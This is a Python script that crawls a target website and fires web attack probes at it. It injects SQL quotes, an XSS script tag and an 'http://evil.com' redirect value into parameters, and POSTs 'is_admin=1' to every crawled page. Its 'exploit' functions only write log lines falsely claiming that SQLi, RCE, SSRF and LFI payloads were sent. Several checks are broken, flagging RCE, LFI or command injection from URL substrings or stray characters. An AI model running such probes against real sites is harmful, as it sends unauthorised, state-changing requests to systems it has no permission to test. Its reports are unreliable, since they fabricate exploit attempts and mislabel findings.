import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import sys

visited = set()
vulnerable_urls = {
    "sql_injection": [],
    "xss": [],
    "open_redirect": [],
    "command_injection": [],
    "file_upload": [],
    "laravel_debug_mode": [],
    "csrf_missing": [],
    "laravel_mass_assignment": [],
    "ojs_exploit": [],
    "sql_login_bypass": [],
    "ssrf": [],
    "rce": [],
    "lfi": []
}

def save_vulnerability(vuln_type, url, output_file):
    if url not in vulnerable_urls[vuln_type]:
        vulnerable_urls[vuln_type].append(url)
    with open(output_file, 'a') as f:
        f.write(f"[{vuln_type.upper()}] {url}\n")

def is_same_domain(base_url, target_url):
    return urlparse(base_url).netloc == urlparse(target_url).netloc

def crawl(base_url, url, url_file):
    try:
        if url in visited:
            return
        visited.add(url)
        print(f"Crawling: {url}")
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')

        with open(url_file, 'a') as f:
            f.write(url + '\n')

        if '?' in url:
            test_vulnerabilities(url, url_file)

        if test_laravel_debug_mode(url):
            save_vulnerability("laravel_debug_mode", url, url_file)
            print(f"[Laravel Debug Mode Exposed] {url}")

        csrf_issues = test_csrf_missing(soup, url)
        for form_url in csrf_issues:
            save_vulnerability("csrf_missing", form_url, url_file)
            print(f"[CSRF Token Missing] {form_url}")
            exploit_csrf_missing(form_url, url_file)

        if test_laravel_mass_assignment(url):
            save_vulnerability("laravel_mass_assignment", url, url_file)
            print(f"[Laravel Mass Assignment Possible] {url}")

        test_file_upload_forms(url, soup, url_file)

        if test_ojs(url):
            save_vulnerability("ojs_exploit", url, url_file)
            print(f"[OJS Exploit Detected] {url}")
            exploit_ojs(url, url_file)

        if test_sql_login_bypass(url):
            save_vulnerability("sql_login_bypass", url, url_file)
            print(f"[Login Bypass via SQL Detected] {url}")
            exploit_sql_login_bypass(url, url_file)

        if test_ssrf(url):
            save_vulnerability("ssrf", url, url_file)
            print(f"[SSRF Possible] {url}")
            exploit_ssrf(url, url_file)

        if test_rce(url):
            save_vulnerability("rce", url, url_file)
            print(f"[RCE Possible] {url}")
            exploit_rce(url, url_file)

        if test_lfi(url):
            save_vulnerability("lfi", url, url_file)
            print(f"[LFI Possible] {url}")
            exploit_lfi(url, url_file)

        for link in soup.find_all('a', href=True):
            abs_link = urljoin(url, link['href'])
            if is_same_domain(base_url, abs_link):
                crawl(base_url, abs_link, url_file)
    except Exception:
        pass

def test_vulnerabilities(url, url_file):
    if test_sql_injection(url):
        save_vulnerability("sql_injection", url, url_file)
        print(f"[SQL Injection Possible] {url}")
        exploit_sql_injection(url, url_file)

    if test_xss(url):
        save_vulnerability("xss", url, url_file)
        print(f"[XSS Possible] {url}")
        exploit_xss(url, url_file)

    if test_open_redirect(url):
        save_vulnerability("open_redirect", url, url_file)
        print(f"[Open Redirect Possible] {url}")
        exploit_open_redirect(url, url_file)

    if test_command_injection(url):
        save_vulnerability("command_injection", url, url_file)
        print(f"[Command Injection Possible] {url}")

def test_sql_injection(url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        payload_values = [v + "'" for v in qs[param]]
        new_qs = qs.copy()
        new_qs[param] = payload_values
        new_query = urlencode(new_qs, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        try:
            r = requests.get(test_url, timeout=5)
            if any(e in r.text.lower() for e in ["sql syntax", "mysql", "syntax error"]):
                return True
        except:
            pass
    return False

def test_xss(url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    test_script = "<script>alert('XSS')</script>"
    for param in qs:
        new_qs = qs.copy()
        new_qs[param] = [test_script]
        new_query = urlencode(new_qs, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        try:
            if test_script.lower() in requests.get(test_url, timeout=5).text.lower():
                return True
        except:
            pass
    return False

def test_open_redirect(url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        new_qs = qs.copy()
        new_qs[param] = ["http://evil.com"]
        new_query = urlencode(new_qs, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        try:
            r = requests.get(test_url, timeout=5, allow_redirects=False)
            if 'location' in r.headers and 'evil.com' in r.headers['location']:
                return True
        except:
            pass
    return False

def test_command_injection(url):
    try:
        if any(ch in requests.get(url, timeout=5).text for ch in [';', '|', '&']):
            return True
    except:
        pass
    return False

def test_ssrf(url):
    return 'url=' in url or 'redirect=' in url

def test_rce(url):
    return any(k in url for k in ['cmd=', 'exec=', 'command='])

def test_lfi(url):
    return 'file=' in url or 'path=' in url

def test_file_upload_forms(page_url, soup, output_file):
    for form in soup.find_all('form'):
        file_inputs = form.find_all('input', {'type': 'file'})
        if file_inputs:
            save_vulnerability("file_upload", page_url, output_file)
            print(f"[File Upload Possible] {page_url}")

def test_laravel_mass_assignment(url):
    try:
        data = {'is_admin': '1'}
        r = requests.post(url, data=data, timeout=5)
        if r.status_code in [200, 201] and "is_admin" in r.text.lower():
            return True
    except:
        pass
    return False

def test_laravel_debug_mode(url):
    try:
        r = requests.get(url, timeout=5)
        if any(ind in r.text.lower() for ind in ['whoops', 'stacktrace']):
            return True
    except:
        pass
    return False

def test_csrf_missing(soup, page_url):
    return [urljoin(page_url, f.get('action', page_url)) for f in soup.find_all('form', method='post') if not f.find('input', {'name': '_token'})]

def test_ojs(url):
    return 'index.php' in url and 'journal' in url

def test_sql_login_bypass(url):
    return 'login' in url and '?' in url

def exploit_sql_injection(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] SQLi sent to {url}\n")

def exploit_xss(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] XSS script injected at {url}\n")

def exploit_open_redirect(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] Redirect payload sent at {url}\n")

def exploit_csrf_missing(form_url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] CSRF POST sent to {form_url} without token\n")

def exploit_ojs(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] Tried PoC OJS at {url}\n")

def exploit_sql_login_bypass(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] Tried SQL login bypass at {url}\n")

def exploit_ssrf(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] SSRF payload sent to {url}\n")

def exploit_rce(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] RCE payload attempted on {url}\n")

def exploit_lfi(url, log_file):
    with open(log_file, 'a') as f:
        f.write(f"[Exploit] LFI payload used on {url}\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script.py http://target.com output.txt")
        sys.exit(1)

    target_url = sys.argv[1]
    output_file = sys.argv[2]

    open(output_file, 'w').close()
    crawl(target_url, target_url, output_file)

    print("\nSummary:")
    print(f"Total URLs visited: {len(visited)}")
    for vuln, urls in vulnerable_urls.items():
        print(f"\n{vuln.replace('_', ' ').title()}: {len(urls)}")
        for u in urls:
            print(u)
